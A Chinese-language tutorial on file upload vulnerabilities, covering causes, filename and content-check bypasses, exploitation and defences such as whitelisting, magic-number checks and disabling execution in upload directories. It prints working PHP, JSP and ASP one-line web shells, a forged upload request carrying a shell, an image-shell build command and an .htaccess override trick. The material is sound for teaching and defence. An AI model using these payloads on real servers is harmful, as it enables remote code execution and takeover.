**文件上传漏洞**

## <font size="5">一、基础概念</font>

### <font size="5">1.1 什么是文件上传漏洞</font>

文件上传漏洞是指应用程序在接收用户上传文件时，未对文件的**类型、内容、大小、存储路径**等进行充分校验，导致攻击者可以上传恶意文件（如 Web Shell、恶意脚本、病毒等），进而实现**远程代码执行、服务器控制、数据窃取**等攻击目标。



### <font size="5">1.2 漏洞产生的根本原因</font>

| 层面   | 典型问题                                   |
| ------ | ------------------------------------------ |
| 前端   | 仅依赖 JavaScript 校验，可被 Burp 抓包绕过 |
| 服务端 | 校验逻辑不严谨、黑名单不完整、顺序错误     |
| 存储   | 上传目录可被 Web 访问且可执行脚本          |
| 解析   | 服务器配置不当，导致非预期后缀被解析       |

**总结**：漏洞的本质不是"文件被上传了"，而是"上传的文件被服务器	    当作代码执行了"。



## <font size="5">二、漏洞常见成因详解</font>

### <font size="5">2.1 前端校验形同虚设</font>

绕过方式：

方法1.禁用浏览器 JavaScript

方法2.使用 Burp Suite 拦截请求，修改文件名后缀后再放行

### <font size="5">2.2 服务端校验的常见缺陷</font>

#### <font size="5">（1）仅校验 Content-Type</font>

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg      <-- 攻击者伪造此处

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

服务端如果只检查 `Content-Type: image/jpeg` 就放行，则恶意 PHP 文件成功上传。

#### <font size="5">(2）黑名单不完整</font>

常见黑名单遗漏的危险后缀：

```
php, php3, php4, php5, php7, phtml, pht, phps,
jsp, jspx, jspf,
asp, aspx, asa, cer, cdx,
exe, sh, py, pl, cgi,
htaccess, user.ini, ...
```

此外还有：

- 大小写混写：`PhP`、`PHP`
- 双写绕过：`pphphp`（服务器删除 `php` 后剩下 `php`）
- 特殊后缀：`shell.php.xxx`、`shell.php%00.jpg`

#### <font size="5">（3）校验顺序错误（先存后检）</font>

某些框架的漏洞案例：

1. 文件先被写入磁盘

2. 再进行扩展名校验

3. 如果校验失败，删除文件

如果攻击者能触发异常（如 CSRF token 无效），导致删除逻辑被跳过，恶意文件就会残留在服务器上。

#### <font size="5">（4）MIME 类型推断错误</font>

部分框架基于 MIME 推断扩展名,而非客户端提供的文件名扩展名：

- 攻击者上传 `shell.php`，但内容是一个 GIF 文件头
- 服务器推断为 `image/gif`，校验通过
- 但文件名仍是 `shell.php`，最终被当作 PHP 执行

### <font size="5">2.3 解析与命名策略缺陷</font>

| 技巧        | 示例               | 原理                                      |
| ----------- | ------------------ | ----------------------------------------- |
| 空字节注入  | `shell.php%00.jpg` | 旧版 PHP 截断，实际保存为 `shell.php`     |
| 空格填充    | `shell.php `       | WAF 未标准化空格，后端规范化后仍为 `.php` |
| 双扩展名    | `shell.php.jpg`    | Apache 某些配置从右向左解析               |
| 点号绕过    | `shell.php.`       | Windows 自动去尾点，保存为 `shell.php`    |
| 分号绕过    | `shell.php;.jpg`   | 部分服务器把 `;` 后当作参数               |
| 大小写      | `shell.PhP`        | Linux 区分大小写，但 Apache 可能不区分    |
| NTFS 数据流 | `shell.php::$DATA` | Windows 特性                              |

## <font size="5">三、漏洞利用方式</font>

### <font size="5">3.1 Web Shell 上传（最直接）</font>

php一句话木马：

```
<?php @eval($_POST['cmd']); ?>

<?php system($_GET['c']); ?>
-GET 传参容易留在日志、浏览器历史、代理记录中，隐蔽性差。

<?php assert($_POST['x']); ?>
-在 PHP 5 / PHP 7.0-7.1 中，assert() 会把字符串参数当作 PHP 代码执行，效果类似 eval()。
```

jsp一句话木马：

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

asp一句话木马：

```
<% eval request("cmd") %>
```

### <font size="5">3.2 绕过 WAF / 过滤器的技巧</font>

| 场景       | 绕过方法                           |
| ---------- | ---------------------------------- |
| 黑名单后缀 | 大小写、双写、特殊后缀、点号、空格 |
| 白名单后缀 | 00 截断、解析漏洞、.htaccess 覆盖  |
| 内容检测   | 图片马（在图片中插入 PHP 代码）    |
| 文件头检测 | 伪造 GIF89a、PNG、JPEG 文件头      |
| 路径检测   | 路径遍历 `../../`                  |
| 大小限制   | 分块上传、压缩包                   |

-图片马制作：

```
copy normal.jpg/b + shell.php/a webshell.jpg
```

-`.htaccess` 不是文件后缀名，而是一个完整的文件名。

举个例子，上传一个内容如下的 `.htaccess`：

```
AddType application/x-httpd-php .gif
```

之后，同目录下任何 `.gif` 文件都会被当作 PHP 执行。攻击者再上传一个包含恶意代码的 `shell.gif`，访问它就能执行 PHP。

## <font size="5">四、防御方案</font>

### <font size="5">5.1 核心防御原则</font>

text

```
白名单 + 内容检查 + 随机命名 + 隔离存储 + 禁用执行
```



### <font size="5">5.2 具体措施</font>

#### <font size="5">（1）严格白名单校验</font>

python

```
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```



- 只允许业务必需的后缀
- 禁止使用黑名单（永远有遗漏）
- 校验前先对文件名做规范化处理

#### <font size="5">（2）校验文件真实内容</font>

python

```
import imghdr

def is_real_image(filepath):
    return imghdr.what(filepath) in ['jpeg', 'png', 'gif']
```



- 读取文件头（Magic Number）
- JPEG：`FF D8 FF`
- PNG：`89 50 4E 47`
- GIF：`47 49 46 38`
- 不要相信客户端提供的 `Content-Type`

#### <font size="5">（3）重命名文件</font>

python

```
import uuid

new_filename = str(uuid.uuid4()) + '.' + ext
```



- 丢弃客户端原始文件名
- 防止路径遍历、空字节注入、特殊字符攻击

#### <font size="5">（4）隔离存储 + 禁用执行</font>

**Nginx 配置示例**：

nginx

```
location /uploads/ {
    location ~ \.(php|jsp|asp|py|sh)$ {
        deny all;
    }
}
```



**Apache 配置示例**：

apache

```
<Directory /var/www/uploads>
    php_admin_flag engine off
    Options -ExecCGI
    AddType text/plain .php .php3 .phtml
</Directory>
```



**最佳实践**：

- 上传目录放在 Web 根目录之外
- 通过独立域名或 CDN 提供文件访问
- 上传目录只有读权限，禁止执行

#### <font size="5">（5）其他加固措施</font>

| 措施         | 说明                   |
| ------------ | ---------------------- |
| 限制文件大小 | 防止 DoS 和磁盘耗尽    |
| 检查文件数量 | 防止批量上传攻击       |
| 病毒扫描     | 使用 ClamAV 等工具     |
| 日志审计     | 记录所有上传行为       |
| 权限最小化   | Web 服务用户权限尽量低 |
| 定期清理     | 删除无用上传文件       |
